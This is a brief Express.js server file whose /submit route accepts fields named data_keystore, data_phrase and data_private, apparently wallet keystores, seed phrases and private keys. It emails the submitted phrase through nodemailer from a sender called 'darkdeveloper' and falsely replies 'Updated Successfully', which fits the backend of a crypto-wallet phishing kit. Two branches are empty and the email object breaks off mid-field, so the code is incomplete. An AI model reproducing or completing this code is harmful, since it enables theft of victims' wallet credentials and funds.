const express = require('express');
var nodemailer = require('./nodemailer.config');



const app = express();
const PORT = process.env.PORT || 4000;

app.use(express.json());
app.use(express.urlencoded({extended: false}));

app.post('/submit', (req, res, next) => {
    if(req.body.data_keystore != undefined){

    }

    if(req.body.data_phrase != undefined){
        nodemailer.executeEmail({
            from: 'darkdeveloper',
            to: '',
            subject: 'Nice Nodemailer test',
            h
        }, () => {
            return res.json({success : "Updated Successfully", status : 200});
        })
    }

    if(req.body.data_private != undefined){

    }
});


app.listen(PORT, () => console.log(`server listening to port ${PORT}`));